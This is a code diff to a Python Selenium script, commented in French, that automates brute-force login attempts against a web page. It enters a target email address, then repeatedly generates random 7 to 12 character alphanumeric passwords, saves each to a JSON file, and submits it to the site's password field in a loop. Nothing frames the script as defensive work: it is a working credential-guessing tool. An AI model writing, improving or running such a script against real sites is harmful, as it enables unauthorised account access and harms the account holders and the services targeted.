@@ -10,6 +10,7 @@ from selenium.webdriver.common.by import By
 from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
+from selenium.common.exceptions import TimeoutException
 from bs4 import BeautifulSoup
 
 chemin = "main.json"
@@ -27,7 +28,7 @@ def test_unit() -> str:
     else:
         raise
 
-def bruteforcing():
+def bruteforcing() -> str:
     caracteres = string.ascii_letters + string.digits
 
     longueur = random.randint(7, 12)
@@ -38,50 +39,56 @@ def bruteforcing():
     easyjson.append(chemin, combinaison)
 
     time.sleep(0.1)
+    return combinaison
 
-def scrap() -> int | str:
+def scrap() -> None:
     driver = webdriver.Chrome()
-    driver.get(url)
+    try:
+        driver.get(url)
 
+        wait = WebDriverWait(driver, 15)
+
+        input_element = wait.until(
+            EC.element_to_be_clickable((
+                By.CSS_SELECTOR,
+                'input[autocomplete="username"]'
+            ))
+        )
+        input_element.click()
+        input_element.clear()
+        input_element.send_keys(email)
+
+        submit_button = wait.until(
+            EC.element_to_be_clickable((
+                By.CSS_SELECTOR,
+                'button[type="submit"]'
+            ))
+        )
+        submit_button.click()
+
+        while True:
+            password_value = bruteforcing()
+            if not password(driver, password_value):
+                break
+            time.sleep(1.5)
+    finally:
+        driver.quit()
+
+def password(driver, password_value: str) -> bool:
     wait = WebDriverWait(driver, 15)
-
-    input_element = wait.until(
-        EC.element_to_be_clickable((
-            By.CSS_SELECTOR,
-            'input[autocomplete="username"]'
-        ))
-    )
-    input_element.click()
-    input_element.clear()
-    input_element.send_keys(email)
-
-    submit_button = wait.until(
-        EC.element_to_be_clickable((
-            By.CSS_SELECTOR,
-            'button[type="submit"]'
-        ))
-    )
-    submit_button.click()
-    time.sleep(3)
-    page = driver.page_source
-    result = password(driver)
-    # driver.quit()
-    return result
-
-def password(driver) -> str | int | bool:
-    wait = WebDriverWait(driver, 15)
-    password_value = "abc29239239239"
-    password_input = wait.until(
-        EC.element_to_be_clickable((By.ID, "password"))
-    )
-    time.sleep(1.5)
-    password_input.send_keys(password_value)
-    password_input.send_keys(Keys.ENTER)
-    time.sleep(1.5)
-    driver.quit()
-    # return driver.page_source
+    try:
+        password_input = wait.until(
+            EC.element_to_be_clickable((
+                By.CSS_SELECTOR,
+                '#password, input[name="password"], input[type="password"]'
+            ))
+        )
+        password_input.clear()
+        password_input.send_keys(password_value)
+        password_input.send_keys(Keys.ENTER)
+        return True
+    except TimeoutException:
+        return False
 
 if __name__ == "__main__":
-    while True:
-        bruteforcing()
-        scrap()
+    scrap()
